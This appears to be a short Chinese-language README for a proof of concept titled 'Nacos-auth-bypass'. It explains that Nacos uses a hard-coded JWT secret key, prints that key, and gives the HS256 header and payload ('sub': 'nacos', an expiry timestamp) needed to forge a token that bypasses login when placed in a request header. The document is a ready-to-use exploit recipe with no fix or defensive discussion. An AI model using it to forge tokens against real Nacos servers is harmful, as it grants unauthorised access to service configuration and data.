# Nacos-auth-bypass

Nacos 身份认证绕过

原理:
JWT SECRET.KEY硬编码

由补丁可知：
nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789

JWT构成：base64编码的header.base64编码的payload+hmac(f(header,payload,key))

由于key硬编码，因此可以根据header+payload构造hmac  通过签名认证
header：
{
  "alg": "HS256"
}

payload：
{
  "sub": "nacos",
  "exp": 1678806359   //这里是时间戳
}

key=SecretKey012345678901234567890123456789012345678901234567890123456789
据此构造json web token 添加到请求头   即可绕过登录认证
